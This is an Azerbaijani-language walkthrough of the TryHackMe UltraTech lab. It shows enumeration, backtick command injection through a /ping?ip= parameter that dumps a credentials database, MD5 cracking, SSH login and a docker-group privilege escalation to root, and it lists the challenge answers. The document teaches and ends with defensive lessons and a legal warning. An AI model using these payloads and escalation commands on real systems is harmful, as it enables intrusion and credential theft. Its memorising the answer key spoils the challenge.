# 🔓 TryHackMe — UltraTech | Azərbaycan Dilli Writeup

**Çətinlik Səviyyəsi:** Orta (Medium)  
**Kateqoriya:** Penetrasyon Testi, Veb Tətbiq Təhlükəsizliyi  
**Platforma:** [TryHackMe — UltraTech](https://tryhackme.com/room/ultratech1)  
**Hədəf OS:** Ubuntu 18.04 Linux  

---

## 📌 Giriş

UltraTech otağı real həyatdakı zəifliklərdən ilham alaraq yaradılıb. Bu bir **grey-box** (boz qutu) pentestidir — yəni bizə yalnız şirkətin adı və server IP ünvanı verilib, başqa heç bir məlumat yoxdur. Hədəfimiz:

1. Açıq portları və xidmətləri kəşf etmək (Enumeration)
2. Veb tətbiqdəki zəifliyi tapmaq (Command Injection)
3. Sistemə giriş əldə etmək (Foothold)
4. Kök (root) səlahiyyəti almaq (Privilege Escalation via Docker)

---

## 🗺️ Hücum Xəritəsi (Attack Path)

```
[Nmap Skan] → [Açıq portlar tapıldı: 21, 22, 8081, 31331]
      ↓
[Gobuster] → [API endpointlər: /auth, /ping]
      ↓
[api.js analizi] → [/ping?ip= parametri kəşf edildi]
      ↓
[Command Injection] → [utech.db.sqlite faylı okundu]
      ↓
[Hash Crack] → [r00t:n100906 parolu tapıldı]
      ↓
[SSH Girişi] → [r00t istifadəçisi kimi sistemə daxil olundu]
      ↓
[Docker qrupu] → [Docker Privilege Escalation]
      ↓
[ROOT 🎯]
```

---

## 📋 İstifadə Edilən Alətlər

| Alət | Məqsəd |
|------|--------|
| **nmap** | Port skanı və servis aşkarlanması |
| **gobuster** | Veb qovluq/endpoint brute-force |
| **curl / brauzer** | API endpointlərin test edilməsi |
| **hashcat** | MD5 hash-in şifrəsinin açılması |
| **ssh** | Uzaqdan giriş |
| **docker** | Privilege escalation |

---

## 🔍 Mərhələ 1 — Enumeration (Kəşfiyyat)

### 1.1 — DNS Qeydi Əlavə Etmək

Hücumdan əvvəl hədəf IP ünvanını bir domen adına uyğunlaşdırırıq ki, daha asan işləyək.

```bash
echo "10.10.185.130 ultratech.thm" >> /etc/hosts
```

**Niyə?** Bəzi veb tətbiqlər IP ilə düzgün işləmir, HOST başlığına ehtiyac duyur. Domenə yönləndirməklə bunu həll edirik. `/etc/hosts` faylı — şəbəkə sorğusu göndərilmədən əvvəl kompüterimizin lokal olaraq yoxladığı "telefon kitabçası" kimidir.

---

### 1.2 — Nmap ilə Port Skanı

**Nmap nədir?** Network Mapper — şəbəkə üzərindəki cihazları, açıq portları və üzərlərindəki servisləri aşkar edən güclü alətdir.

**Addım 1 — Sürətli ümumi skan:**

```bash
nmap 10.10.185.130
```

Bu əmr sadəcə ən çox istifadə olunan 1000 portu yoxlayır. Ümumi mənzərəni görürük.

**Addım 2 — Tam və dərin skan (aggressive):**

```bash
sudo nmap -Pn -sS -sC -sV -p- 10.10.185.130
```

**Hər parametrin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-Pn` | Ping yoxlamasını atla (bəzi sistemlər ping-ə cavab vermir) |
| `-sS` | SYN (stealth) skan — TCP bağlantını tam tamamlamır, daha sürətli və gizli |
| `-sC` | Default skriptləri işlət — servis haqqında əlavə məlumat topla |
| `-sV` | Servis versiyasını aşkarla |
| `-p-` | Bütün 65535 portu yoxla (default 1000 deyil) |

**Nəticə:**

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

**Nəyi öyrəndik?**

- **Port 21 — FTP:** Fayl transfer protokolu. İstifadəçi adı/parol olmadan anonim girişi yoxlamaq lazımdır.
- **Port 22 — SSH:** Uzaqdan komanda xətti girişi. Əgər istifadəçi adı + parol taparsaq buraya giriş edəcəyik.
- **Port 8081 — Node.js API:** Bir REST API işləyir. Bu bizim əsas hədəfimizdir!
- **Port 31331 — Apache:** Şirkətin əsas veb saytı burada.
- **OS:** Ubuntu Linux 18.04

---

### 1.3 — Gobuster ilə Qovluq Brute-Force

**Gobuster nədir?** Veb serverlərdəki gizli qovluqları, faylları və endpoint-ləri söz siyahısı istifadə edərək tapmağa çalışan alətdir. Hər sözü URL-ə əlavə edib cavabı yoxlayır.

**Port 8081 (Node.js API) üzərində skan:**

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.185.130:8081
```

**Parametrlərin izahı:**
- `dir` — qovluq axtarma rejimi
- `-w` — istifadə ediləcək söz siyahısı (wordlist). `common.txt` ən çox istifadə olunan veb qovluq adlarını ehtiva edir
- `-u` — hədəf URL

**Nəticə:**

```
/auth  (Status: 200)
/ping  (Status: 200)
```

İki maraqlı endpoint tapıldı:
- `/auth` — giriş/autentifikasiya üçün
- `/ping` — ping funksiyası üçün (bu **çox şübhəli** görünür!)

**Port 31331 (Apache) üzərində skan:**

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.185.130:31331
```

**Nəticə:**

```
/css         (Status: 301)
/images      (Status: 301)
/index.html  (Status: 200)
/js          (Status: 301)
/robots.txt  (Status: 200)
```

`robots.txt` tapıldı — bu fayldır! `robots.txt` axtarış motorlarına hansı səhifələri indeksləməməsini deyir, amma o səhifələr bizim üçün çox maraqlı ola bilər.

---

### 1.4 — robots.txt və Sitemap-i Araşdırmaq

Brauzerdə açırıq:

```
http://10.10.185.130:31331/robots.txt
```

Məzmun:
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Sitemap-ə baxırıq:

```
http://10.10.185.130:31331/utech_sitemap.txt
```

Nəticə:
```
/index.html
/what.html
/partners.html
```

`partners.html` — tərəfdaşlar səhifəsi ən maraqlı görünür, çünki burada giriş paneli ola bilər. Açırıq!

---

### 1.5 — api.js Faylını Analiz Etmək

`partners.html` səhifəsinin mənbə koduna baxırıq (`Ctrl+U`). Orada bir JavaScript faylına istinad var:

```
/js/api.js
```

Bu faylı açırıq:

```javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
        return `${window.location.hostname}:8081`
    }
  
    function checkAPIStatus() {
        const req = new XMLHttpRequest();
        try {
            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            req.open('GET', url, true);
            // ...
        }
    }
    
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
})();
```

**Bu koddan nə öyrəndik?**

1. API `8081` portunda işləyir
2. `/ping?ip=` parametrini qəbul edir — yəni server tərəfdə bir IP ünvanına ping atır
3. Login formu `http://[host]:8081/auth` adresinə göndərilir

**🚨 Şübhə:** `/ping?ip=` parametri birbaşa əmr icrasına yol aça bilər (Command Injection)! Çünki server bu IP-ni mümkündür ki, sistem komandası kimi birbaşa icra edir.

---

## 💉 Mərhələ 2 — Command Injection (Əmr İnjeksiyası)

### Command Injection nədir?

Veb tətbiq istifadəçidən giriş qəbul edib onu sistem əmri kimi icra edərsə, təcavüzkar öz əmrlərini əlavə edə bilər. Məsələn, server belə bir kod işlədə bilər:

```python
# Server tərəfindəki zəif kod (nümunə)
os.system("ping -c 1 " + user_input)
```

Əgər `user_input` = `127.0.0.1` olarsa → `ping -c 1 127.0.0.1` (normal işləyir)  
Amma əgər `user_input` = `` 127.0.0.1 `ls` `` olarsa → `ping -c 1 127.0.0.1 `ls`` → server həm ping atır, həm `ls` əmrini icra edir!

**Backtick ( `` ` `` )** Unix/Linux-da "əmr əvəzləmə" (command substitution) üçün istifadə olunur.

---

### 2.1 — Zəifliyi Test Etmək

Brauzerdə açırıq:

```
http://10.10.185.130:8081/ping?ip=127.0.0.1
```

Normal ping cavabı gəlir — server həqiqətən IP-ni ping edir. İndi injection sınayırıq:

```
http://10.10.185.130:8081/ping?ip=127.0.0.1%20`ls`
```

**URL kodlaması izahı:**
- `%20` = boşluq (space)
- `` `ls` `` = `ls` əmrini icra et (backtick ilə)

**Nəticə:**

```
ping: utech.db.sqlite: Name or service not known
```

**🎉 Uğur!** Server `ls` əmrini icra etdi və cari qovluqdakı faylları sıraladı. `utech.db.sqlite` adlı bir verilənlər bazası faylı var!

---

### 2.2 — Verilənlər Bazasını Oxumaq

```
http://10.10.185.130:8081/ping?ip=127.0.0.1%20`cat%20utech.db.sqlite`
```

**İzah:**
- `cat` — faylın məzmununu oxuyub çıxaran əmr
- `%20` — URL-də boşluq
- Backtick `` ` `` — əmri icra etdirən simvol

**Nəticə (xam mətn):**

```
ping: ) ▒▒▒▒▒▒▒▒(▒▒▒M▒r00tf357a0c52799563c7c7b76c1e7543a32)▒▒▒M▒admin0d0ea5111e3c1def594c1684e3b9be84
```

Bu ikili faylın çıxışıdır, amma içərisindən oxuna bilən hissələr var:

| İstifadəçi | Hash |
|------------|------|
| `r00t` | `f357a0c52799563c7c7b76c1e7543a32` |
| `admin` | `0d0ea5111e3c1def594c1684e3b9be84` |

Bu hashlar **MD5** formatındadır (32 simvol, hex).

---

## 🔑 Mərhələ 3 — Hash Crack (Şifrəni Açmaq)

### MD5 Hash nədir?

MD5 — mətn üzərindən tətbiq olunan bir "çevirici" funksiyasıdır. `n100906` → `f357a0c52799563c7c7b76c1e7543a32`. Geri dönüş mümkün deyil (nəzəri olaraq). Amma böyük söz siyahıları ilə bütün mümkün parolları hash-ləyib müqayisə etmək olar — buna **dictionary attack** deyilir.

**Hashcat ilə crack etmək:**

```bash
hashcat f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt --force
```

**Parametrlərin izahı:**
- İlk arqument — crack etmək istədiyimiz hash
- `/usr/share/wordlists/rockyou.txt` — 14 milyondan çox real parol içərən söz siyahısı (sızdırılmış parol bazasından əldə edilib)
- `--force` — GPU/hardware xəbərdarlıqlarını keç

**Alternativ — Onlayn CrackStation:**

[crackstation.net](https://crackstation.net) saytına hash-i daxil etmək — hashcat qurulmadan sürətli nəticə verir.

**Nəticə:**

```
f357a0c52799563c7c7b76c1e7543a32 : n100906   ← r00t istifadəçisinin parolu
0d0ea5111e3c1def594c1684e3b9be84 : mrsheafy  ← admin istifadəçisinin parolu
```

---

## 🖥️ Mərhələ 4 — SSH ilə Sistemə Giriş

İndi `r00t` istifadəçisi kimi SSH vasitəsilə sistemə daxil oluruq:

```bash
ssh r00t@10.10.185.130
```

Parol soruşulur:
```
r00t@10.10.185.130's password: n100906
```

**SSH nədir?** Secure Shell — şifrəli uzaqdan komanda xətti bağlantısı. Sanki hədəf kompüterin qarşısında oturub terminal işlədirsiniz.

**Giriş uğurlu:**

```
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)
r00t@ultratech-prod:~$
```

Sistemdəyik! Amma `r00t` istifadəçisiyik, həqiqi `root` deyil. İndi privilege escalation (imtiyaz artırma) lazımdır.

---

### 4.1 — Sistem Araşdırması

Əvvəlcə kim olduğumuzu yoxlayırıq:

```bash
id
```

**Nəticə:**

```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

**🚨 Kritik kəşf:** `r00t` istifadəçisi **`docker` qrupunun üzvüdür!**

**Bu niyə təhlükəlidir?** Docker konteynerlər yarada bilmək — Linux sistemlərini tamamilə dəyişdirə bilmək deməkdir. `docker` qrupuna üzv olmaq çox vaxt root ilə bərabər tutulur.

```bash
sudo -l
```

```
Sorry, user r00t may not run sudo on ultratech-prod.
```

`sudo` yoxdur. Amma Docker var!

---

## ⬆️ Mərhələ 5 — Docker ilə Privilege Escalation (İmtiyaz Artırma)

### Docker nədir?

Docker — tətbiqləri izolyasiya edilmiş mühitlərdə (konteynerlərdə) işlətmək üçün platformadır. Konteyner içərisindən host sistemin fayllarına çatmaq mümkün deyil... amma bunu bilerek konfiqurasiya etmək mümkündür.

### Zəiflik necə işləyir?

Docker-da `-v /:/mnt` parametri var. Bu parametr **host sistemin kök (`/`) qovluğunu** konteynerin `/mnt` qovluğuna **birləşdirir (mount)**. Yəni konteyner içərisindən host sistemin bütün fayllarına yazıb-oxuya bilərik — root icazəsi ilə!

### GTFOBins nədir?

[GTFOBins](https://gtfobins.github.io) — müxtəlif Linux əmrlərinin imtiyaz artırma üçün necə istismar edilə biləcəyini göstərən açıq bir kataloqdur. Penetrasyon testçilərinin əsas resursu.

---

### 5.1 — Mövcud Docker Image-ləri Yoxlamaq

```bash
docker ps -a
```

**Nəticə:**

```
CONTAINER ID  IMAGE  COMMAND                  STATUS
7beaaeecd784  bash   "docker-entrypoint.s…"   Exited (130)
696fb9b45ae5  bash   "docker-entrypoint.s…"   Exited (127)
9811859c4c5c  bash   "docker-entrypoint.s…"   Exited (127)
```

`bash` image mövcuddur! Bu bizim üçün idealdir.

---

### 5.2 — Docker ilə Root Əldə Etmək

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

**Bu əmrin hər hissəsinin izahı:**

| Hissə | Mənası |
|-------|--------|
| `docker run` | Yeni konteyner başlat |
| `-v /:/mnt` | Host sistemin kök `/` qovluğunu konteynerin `/mnt`-inə mount et |
| `--rm` | Konteyner bitdikdə avtomatik sil |
| `-it` | İnteraktiv terminal aç (`-i` interaktiv, `-t` pseudo-TTY) |
| `bash` | Hansı Docker image-i istifadə et |
| `chroot /mnt` | Kök qovluğu `/mnt`-ə dəyiş — yəni indi biz host sistemin kökündəyik |
| `sh` | Shell (qabıq) aç |

**Nəticə:**

```bash
# whoami
root
```

**ROOT ƏLDƏ ETDİK! 🎉**

`chroot /mnt` əmri ilə biz konteynerin içərisindən host sistemin kök qovluğunu "əsas" qovluq kimi işlətdik. Docker konteyneri root olaraq işlədiyindən, host sistemə də root olaraq çatdıq.

---

## 🏁 Mərhələ 6 — Flagı Tapmaq

Root-un SSH açarını oxuyuruq:

```bash
cat /root/.ssh/id_rsa
```

**Nəticə:**

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
...
-----END RSA PRIVATE KEY-----
```

**Sualın cavabı — ilk 9 simvol:**

```
MIIEogIBA
```

---

## 📊 Sualların Xülasəsi

### Task 2 — Enumeration

| # | Sual | Cavab |
|---|------|-------|
| 1 | Port 8081-dəki proqram? | `Node.js` |
| 2 | Digər qeyri-standart port? | `31331` |
| 3 | O portdakı proqram? | `Apache` |
| 4 | GNU/Linux distribusiyası? | `Ubuntu` |
| 5 | API neçə route istifadə edir? | `2` (`/auth` və `/ping`) |

### Task 3 — Exploitation

| # | Sual | Cavab |
|---|------|-------|
| 1 | Verilənlər bazasının adı? | `utech.db.sqlite` |
| 2 | Birinci istifadəçinin hash-i? | `f357a0c52799563c7c7b76c1e7543a32` |
| 3 | Həmin hash-in parolu? | `n100906` |

### Task 4 — Root

| # | Sual | Cavab |
|---|------|-------|
| 1 | Root SSH açarının ilk 9 simvolu? | `MIIEogIBA` |

---

## 🎓 Öyrənilən Dərslər

### 1. Port Skanının Əhəmiyyəti
Standart portlara (80, 443) baxmaq kifayət deyil. Bu halda kritik zəiflik 8081 portunda idi — standart skan onu atmış ola bilərdi. Həmişə `-p-` ilə bütün portları skanla.

### 2. JavaScript Faylları Çox Şey Deyir
Frontend JavaScript faylları API endpoint-lərini, server URL-lərini, parametr adlarını açıq saxlaya bilər. `api.js` bizə birbaşa `/ping?ip=` zəifliyini göstərdi.

### 3. Command Injection — Çox Ciddi Zəiflik
İstifadəçi girişi birbaşa sistem əmrinə əlavə edilərsə, müdhiş nəticələr ola bilər. Düzgün giriş doğrulaması (input validation/sanitization) mütləqdir. OWASP Top 10-un birincisi buradadır.

### 4. Parol Hashları Güclü Olmalıdır
MD5 hashlar sürətlə kırılır — rockyou.txt ilə 4 saniyədə! Real sistemlər üçün bcrypt, scrypt, argon2 kimi güclü hash alqoritmləri lazımdır.

### 5. Docker Qrupu = Təsirsiz Root Qadağaları
`sudo` qadağalansa belə, `docker` qrupuna üzvlük root ilə bərabərdir. Prinsip sadədir: **minimum imtiyaz** (least privilege). Heç kim lazımsız qrup üzvlüyünə sahib olmamalıdır.

---

## ⚠️ Hüquqi Xəbərdarlıq

Bu writeup yalnız **TryHackMe platformasındakı nəzərdə tutulmuş CTF tapşırığı** üçün hazırlanmışdır. Burada öyrənilən metodları real insanlara ya da sistemlərə icazəsiz şəkildə tətbiq etmək **qeyri-qanuni** və **etikaya ziddir**. Penetrasyon testi bacarıqlarını həmişə qanuni çərçivədə, icazə alınaraq istifadə edin.

---

*Writeup hazırladı: Azərbaycan dilli TryHackMe icması üçün*
